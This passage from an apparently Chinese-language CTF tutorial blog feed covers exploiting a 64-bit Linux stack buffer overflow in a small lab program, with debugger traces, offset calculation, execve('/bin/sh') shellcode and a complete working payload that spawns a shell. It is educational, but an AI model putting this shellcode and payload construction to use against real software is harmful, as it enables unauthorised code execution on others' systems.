</span><br><span class="line">   0x7ffff7e3a424 &lt;puts+4&gt;         push   r14</span><br><span class="line">   0x7ffff7e3a426 &lt;puts+6&gt;         push   r13</span><br><span class="line">   0x7ffff7e3a428 &lt;puts+8&gt;         push   r12</span><br><span class="line">   0x7ffff7e3a42a &lt;puts+10&gt;        mov    r12, rdi</span><br><span class="line">   0x7ffff7e3a42d &lt;puts+13&gt;        push   rbp</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] Id 1, Name: <span class="string">&quot;bof&quot;</span>, stopped 0x7ffff7e3a420 <span class="keyword">in</span> puts (), reason: BREAKPOINT</span></span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] 0x7ffff7e3a420 → puts()</span></span><br><span class="line"><span class="meta">[#</span><span class="language-bash">1] 0x555555555222 → main(argc=0x2, argv=0x7fffffffdf38)</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤</span><br></pre></td></tr></table></figure><p>我们发现，明明在 <code>strcpy</code> 上也下了断点，可是并未停止，不知道为什么我们 <code>r</code> 后，直接就在 <code>puts</code> 处停止了。过了 <code>strcpy</code> 调用之后你会发现当前缓冲区指针指向 <code>0x00007fffffffdd40</code> 而不是 <code>0x7fffffffddb0</code> 这是gdb的环境变量和其他东西造成的。不过现在我们不关心之后会解决的，继续向下看 si 到 <code>ret</code> 指令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">gef➤  finish</span><br><span class="line">......</span><br><span class="line">gef➤  si</span><br><span class="line">0x000055555555522814&#125;</span><br><span class="line"></span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────── registers ────</span><br><span class="line"><span class="meta">$</span><span class="language-bash">rax   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbx   : 0x0000555555555230  →  &lt;__libc_csu_init+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rcx   : 0x00007ffff7ec4077  →  0x5177fffff0003d48 (<span class="string">&quot;H=&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdx   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsp   : 0x00007fffffffde48  →  <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbp   : 0x4141414141414141 (<span class="string">&quot;AAAAAAAA&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsi   : 0x00005555555592a0  →  <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdi   : 0x00007ffff7fa47e0  →  0x0000000000000000</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rip   : 0x0000555555555228  →  &lt;main+127&gt; ret</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r8    : 0x12d</span>             </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r9    : 0xf</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r10   : 0x0000555555556006  →  0x00443b031b01000a (<span class="string">&quot;\n&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r11   : 0x246</span>             </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r12   : 0x00005555555550c0  →  &lt;_start+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r13   : 0x00007fffffffdf30  →  0x0000000000000002</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r14   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r15   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">eflags: [ZERO carry PARITY adjust sign <span class="built_in">trap</span> INTERRUPT direction overflow resume virtualx86 identification]</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">cs: 0x33 <span class="variable">$ss</span>: 0x2b <span class="variable">$ds</span>: 0x00 <span class="variable">$es</span>: 0x00 <span class="variable">$fs</span>: 0x00 <span class="variable">$gs</span>: 0x00</span> </span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0x00007fffffffde48│+0x0000: &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot; ← $rsp</span><br><span class="line">0x00007fffffffde50│+0x0008: &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">0x00007fffffffde58│+0x0010: &quot;AAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">0x00007fffffffde60│+0x0018: &quot;AAAAAAAAAAAA&quot;</span><br><span class="line">0x00007fffffffde68│+0x0020: 0x0000550041414141 (&quot;AAAA&quot;?)</span><br><span class="line">0x00007fffffffde70│+0x0028: 0x0000555555555230  →  &lt;__libc_csu_init+0&gt; endbr64 </span><br><span class="line">0x00007fffffffde78│+0x0030: 0x395b03b9e69a9ef5</span><br><span class="line">0x00007fffffffde80│+0x0038: 0x00005555555550c0  →  &lt;_start+0&gt; endbr64 </span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">   0x55555555521d &lt;main+116&gt;       call   0x555555555090 &lt;puts@plt&gt;</span><br><span class="line">   0x555555555222 &lt;main+121&gt;       mov    eax, 0x0</span><br><span class="line">   0x555555555227 &lt;main+126&gt;       leave  </span><br><span class="line"> → 0x555555555228 &lt;main+127&gt;       ret    </span><br><span class="line">[!] Cannot disassemble from $PC</span><br><span class="line">─────────────────────────────────────────────────────────── source:bof.c+14 ────</span><br><span class="line">      9       &#125;</span><br><span class="line">     10       printf(&quot;%p\n&quot;, buffer);</span><br><span class="line">     11       strcpy(buffer,  argv[1]);</span><br><span class="line">     12       printf(&quot;%s\n&quot;, buffer);</span><br><span class="line">     13       return 0;</span><br><span class="line"> →   14 &#125;</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] Id 1, Name: <span class="string">&quot;bof&quot;</span>, stopped 0x555555555228 <span class="keyword">in</span> main (), reason: SINGLE STEP</span></span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] 0x555555555228 → main(argc=0x2, argv=0x7fffffffdf38)</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  </span><br></pre></td></tr></table></figure><p>当执行 <code>ret</code> 时，<code>rsp ---&gt; 0x4141414141414141</code>，我们没能控制 <code>RIP</code> 为什么因为我们覆盖了太多位，最大的地址是 <code>0x00007fffffffffff</code> 而我们尝试用 <code>0x4141414141414141</code> 去溢出了。</p><h2 id="4-控制rip"><a class="markdownIt-Anchor" href="#4-控制rip"></a> 4. 控制RIP</h2><p>为了解决这个问题，我们可以用个小一点的缓冲区去溢出这样指向 <code>rsp</code> 的地址就会像 <code>0x0000414141414141</code> 一样了。 通过简单的数学运算就可以很轻松地算出我们缓冲区的大小。我们知道缓冲区开始于 <code>0x00007fffffffdd40</code> 。strcpy 之后 rsp 将指向 <code>0x00007fffffffde48</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00007fffffffde48 - 0x00007fffffffdd40 = 0x108 -&gt; 十进制的264</span><br></pre></td></tr></table></figure><p>知道了这些我们可以把溢出载荷修改成这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;A&quot; * 264 + &quot;B&quot; * 6</span><br></pre></td></tr></table></figure><p>rsp指向的地址应该是 0x0000424242424242 ，那样就能控制RIP。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────── registers ────</span><br><span class="line"><span class="meta">$</span><span class="language-bash">rax   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbx   : 0x0000555555555230  →  &lt;__libc_csu_init+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rcx   : 0x00007ffff7ec4077  →  0x5177fffff0003d48 (<span class="string">&quot;H=&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdx   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsp   : 0x00007fffffffde70  →  0x00007ffff7ffc620  →  0x00050a3600000000</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbp   : 0x4141414141414141 (<span class="string">&quot;AAAAAAAA&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsi   : 0x00005555555592a0  →  <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdi   : 0x00007ffff7fa47e0  →  0x0000000000000000</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rip   : 0x424242424242</span>    </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r8    : 0x10f</span>             </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r9    : 0xf</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r10   : 0x0000555555556006  →  0x00443b031b01000a (<span class="string">&quot;\n&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r11   : 0x246</span>             </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r12   : 0x00005555555550c0  →  &lt;_start+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r13   : 0x00007fffffffdf50  →  0x0000000000000002</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r14   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r15   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">eflags: [ZERO carry PARITY adjust sign <span class="built_in">trap</span> INTERRUPT direction overflow RESUME virtualx86 identification]</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">cs: 0x33 <span class="variable">$ss</span>: 0x2b <span class="variable">$ds</span>: 0x00 <span class="variable">$es</span>: 0x00 <span class="variable">$fs</span>: 0x00 <span class="variable">$gs</span>: 0x00</span> </span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0x00007fffffffde70│+0x0000: 0x00007ffff7ffc620  →  0x00050a3600000000 ← $rsp</span><br><span class="line">0x00007fffffffde78│+0x0008: 0x00007fffffffdf58  →  0x00007fffffffe2a7  →  0x61732f656d6f682f</span><br><span class="line">0x00007fffffffde80│+0x0010: 0x0000000200000000</span><br><span class="line">0x00007fffffffde88│+0x0018: 0x00005555555551a9  →  &lt;main+0&gt; endbr64 </span><br><span class="line">0x00007fffffffde90│+0x0020: 0x0000555555555230  →  &lt;__libc_csu_init+0&gt; endbr64 </span><br><span class="line">0x00007fffffffde98│+0x0028: 0xbdf64f9ef20c1d5a</span><br><span class="line">0x00007fffffffdea0│+0x0030: 0x00005555555550c0  →  &lt;_start+0&gt; endbr64 </span><br><span class="line">0x00007fffffffdea8│+0x0038: 0x00007fffffffdf50  →  0x0000000000000002</span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">[!] Cannot disassemble from $PC</span><br><span class="line">[!] Cannot access memory at address 0x424242424242</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] Id 1, Name: <span class="string">&quot;bof&quot;</span>, stopped 0x424242424242 <span class="keyword">in</span> ?? (), reason: SIGSEGV</span></span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  </span><br></pre></td></tr></table></figure><p>可以看到 <code>$rip : 0x424242424242</code> ，程序流程已经被我们控制了。</p><h2 id="5-跳入用户控制的缓冲区"><a class="markdownIt-Anchor" href="#5-跳入用户控制的缓冲区"></a> 5. 跳入用户控制的缓冲区</h2><p>事实上这部分内容没什么特别的或者新的东西你只需要指向你<strong>控制的缓冲区开头</strong>，也就是第一个 <code>printf</code> 显示出来的值，在这里是 <code>0x00007fffffffdd40</code>。通过 <code>gdb</code> 也可以很容易地重新获得这个值你只需在调用 <code>strcpy</code> 之后显示栈。（在上面是我们运行到断点 puts 处）</p><p>是时候更新我们的载荷了，新的载荷看起来像这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;A&quot; * 264 + &quot;\x7f\xff\xff\xff\xdd\x40&quot;[::-1] </span><br></pre></td></tr></table></figure><p>因为是小端结构所以我们需要把内存地址反序。这就是python语句[::-1]所实现的。</p><p>确认下我们跳入正确的地址，gdb 调试程序到指令 ret 处：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">gef➤  b puts</span><br><span class="line">Breakpoint 1 at 0x1090</span><br><span class="line">gef➤  r $(python -c &#x27;print &quot;A&quot; * 264 + &quot;\x7f\xff\xff\xff\xdd\x40&quot;[::-1]&#x27;) </span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────── registers ────</span><br><span class="line"><span class="meta">$</span><span class="language-bash">rax   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbx   : 0x0000555555555230  →  &lt;__libc_csu_init+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rcx   : 0x00007ffff7ec4077  →  0x5177fffff0003d48 (<span class="string">&quot;H=&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdx   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsp   : 0x00007fffffffde68  →  0x00007fffffffdd40  →  0x0000000000000000</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbp   : 0x4141414141414141 (<span class="string">&quot;AAAAAAAA&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsi   : 0x00005555555592a0  →  <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdi   : 0x00007ffff7fa47e0  →  0x0000000000000000</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rip   : 0x0000555555555228  →  &lt;main+127&gt; ret</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r8    : 0x10f</span>             </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r9    : 0xf</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r10   : 0x0000555555556006  →  0x00443b031b01000a (<span class="string">&quot;\n&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r11   : 0x246</span>             </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r12   : 0x00005555555550c0  →  &lt;_start+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r13   : 0x00007fffffffdf50  →  0x0000000000000002</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r14   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r15   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">eflags: [ZERO carry PARITY adjust sign <span class="built_in">trap</span> INTERRUPT direction overflow resume virtualx86 identification]</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">cs: 0x33 <span class="variable">$ss</span>: 0x2b <span class="variable">$ds</span>: 0x00 <span class="variable">$es</span>: 0x00 <span class="variable">$fs</span>: 0x00 <span class="variable">$gs</span>: 0x00</span> </span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0x00007fffffffde68│+0x0000: 0x00007fffffffdd40  →  0x0000000000000000 ← $rsp</span><br><span class="line">0x00007fffffffde70│+0x0008: 0x00007ffff7ffc620  →  0x00050a3600000000</span><br><span class="line">0x00007fffffffde78│+0x0010: 0x00007fffffffdf58  →  0x00007fffffffe2a7  →  0x61732f656d6f682f</span><br><span class="line">0x00007fffffffde80│+0x0018: 0x0000000200000000</span><br><span class="line">0x00007fffffffde88│+0x0020: 0x00005555555551a9  →  &lt;main+0&gt; endbr64 </span><br><span class="line">0x00007fffffffde90│+0x0028: 0x0000555555555230  →  &lt;__libc_csu_init+0&gt; endbr64 </span><br><span class="line">0x00007fffffffde98│+0x0030: 0x81a925b6868c83d3</span><br><span class="line">0x00007fffffffdea0│+0x0038: 0x00005555555550c0  →  &lt;_start+0&gt; endbr64 </span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">   0x55555555521d &lt;main+116&gt;       call   0x555555555090 &lt;puts@plt&gt;</span><br><span class="line">   0x555555555222 &lt;main+121&gt;       mov    eax, 0x0</span><br><span class="line">   0x555555555227 &lt;main+126&gt;       leave  </span><br><span class="line"> → 0x555555555228 &lt;main+127&gt;       ret    </span><br><span class="line">   ↳  0x7fffffffdd40                  add    BYTE PTR [rax], al</span><br><span class="line">      0x7fffffffdd42                  add    BYTE PTR [rax], al</span><br><span class="line">      0x7fffffffdd44                  add    BYTE PTR [rax], al</span><br><span class="line">      0x7fffffffdd46                  add    BYTE PTR [rax], al</span><br><span class="line">      0x7fffffffdd48                  and    dl, BYTE PTR [rdx+0x55]</span><br><span class="line">      0x7fffffffdd4b                  push   rbp</span><br><span class="line">─────────────────────────────────────────────────────────── source:bof.c+14 ────</span><br><span class="line">      9       &#125;</span><br><span class="line">     10       printf(&quot;%p\n&quot;, buffer);</span><br><span class="line">     11       strcpy(buffer,  argv[1]);</span><br><span class="line">     12       printf(&quot;%s\n&quot;, buffer);</span><br><span class="line">     13       return 0;</span><br><span class="line"> →   14 &#125;</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] Id 1, Name: <span class="string">&quot;bof&quot;</span>, stopped 0x555555555228 <span class="keyword">in</span> main (), reason: SINGLE STEP</span></span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] 0x555555555228 → main(argc=0x2, argv=0x7fffffffdf58)</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们可以看到，此时的栈顶 (<code>rsp</code>) 为 <code>0x00007fffffffdd40</code>，<code>ret</code> 执行后 <code>rip</code> 就将跳转到 <code>0x00007fffffffdd40</code> 处执行。</p><h2 id="6-执行shellcode"><a class="markdownIt-Anchor" href="#6-执行shellcode"></a> 6. 执行shellcode</h2><p>在这个例子中我准备用个定制的shellcode去打开 shell 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line"> </span><br><span class="line">_start:</span><br><span class="line">; execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;], NULL)</span><br><span class="line">; rax = 0x3b, rdx= NULL, rdi = &#x27;//bin/sh&#x27;, rsi = &#x27;//bin/sh&#x27;</span><br><span class="line">xorrdx, rdx</span><br><span class="line">movqword rbx, &#x27;//bin/sh&#x27;; 0x68732f6e69622f2f</span><br><span class="line">shrrbx, 0x8</span><br><span class="line">pushrbx</span><br><span class="line">movrdi, rsp</span><br><span class="line">pushrax</span><br><span class="line">pushrdi</span><br><span class="line">movrsi, rsp</span><br><span class="line">moval, 0x3b</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>接下来汇编这个文件然后提取shellcode。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/overflow$ touch shell.asm</span><br><span class="line">sakura@Kylin:~/文档/overflow$ nasm -f elf64 shell.asm </span><br><span class="line">sakura@Kylin:~/文档/overflow$ ld -m elf_x86_64 shell.o -o shell </span><br><span class="line">sakura@Kylin:~/文档/overflow$ ./shell</span><br><span class="line"><span class="meta">$ </span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line">sakura@Kylin:~/文档/overflow$ for i in $(objdump  -d shell.o | grep &quot;^ &quot; | cut  -f2); do echo  -n  &#x27;\x&#x27;$i; done; echo </span><br><span class="line">\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05</span><br><span class="line">sakura@Kylin:~/文档/overflow$ </span><br></pre></td></tr></table></figure><p>这个 shellcode 长 30 字节，来构造最终的载荷吧。</p><p>原来的载荷</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(python -c <span class="string">&#x27;print &quot;A&quot; * 264 + &quot;\x7f\xff\xff\xff\xdd\x40&quot;[::-1]&#x27;</span>) </span><br></pre></td></tr></table></figure><p>我们要保证一样的大小所以264 - 30 = 234</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(python -c <span class="string">&#x27;print &quot;A&quot; * 234 + &quot;\x7f\xff\xff\xff\xdd\x40&quot;[::-1]&#x27;</span>) </span><br></pre></td></tr></table></figure><p>然后把 shellcode 接在开头：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(python -c <span class="string">&#x27;print  &quot;\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&quot; + &quot;A&quot; * 234 +  &quot;\x7f\xff\xff\xff\xdd\x40&quot;[::-1]&#x27;</span>) </span><br></pre></td></tr></table></figure><p>来把所有东西一块儿测试：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">gdb-gef bof</span> </span><br><span class="line">gef➤  run $(python -c &#x27;print  &quot;\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&quot; + &quot;A&quot; * 234 +  &quot;\x7f\xff\xff\xff\xdd\x40&quot;[::-1]&#x27;) </span><br><span class="line">Starting program: /home/sakura/文档/overflow/bof $(python -c &#x27;print  &quot;\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&quot; + &quot;A&quot; * 234 +  &quot;\x7f\xff\xff\xff\xdd\x40&quot;[::-1]&#x27;)</span><br><span class="line">[*] Failed to find objfile or not a valid file format: [Errno 2] 没有那个文件或目录: &#x27;system-supplied DSO at 0x7ffff7fcd000&#x27;</span><br><span class="line">0x7fffffffdd40</span><br><span class="line">H1�H�//bin/shH�SH��PWH��;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`����</span><br><span class="line">process 4893 is executing new program: /usr/bin/dash</span><br><span class="line"><span class="meta">$ </span></span><br></pre></td></tr></table></figure><p>出现了 $ 就显示我们执行成功了。要注意内存地址是可以变化的这样可能就和我这里的不同了。</p><blockquote><p>参考：</p><p><a href="http://packetstormsecurity.com/files/download/127007/64bit-overflow.pdf">64 Bits Linux Stack Based Buffer Overflow  </a> — 英文原文</p><p><a href="https://juejin.cn/post/6844903571742261262#heading-0">64位Linux下的栈溢出</a> — 中文翻译</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;1-x86和x86_64的区别&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-x86和x86_64的区别&quot;&gt;&lt;/a&gt; 1. x86和x86_64的区别&lt;/h2&gt;
&lt;p&gt;第一个主要区别就是内存地址的大小。这没</summary>
      
    
    
    
    <category term="CTF" scheme="https://www.rgzzplus.com/categories/CTF/"/>
    
    
    <category term="栈溢出" scheme="https://www.rgzzplus.com/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>格式化字符串x86_64</title>
    <link href="https://www.rgzzplus.com/2022/08/27/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2x86-64/"/>
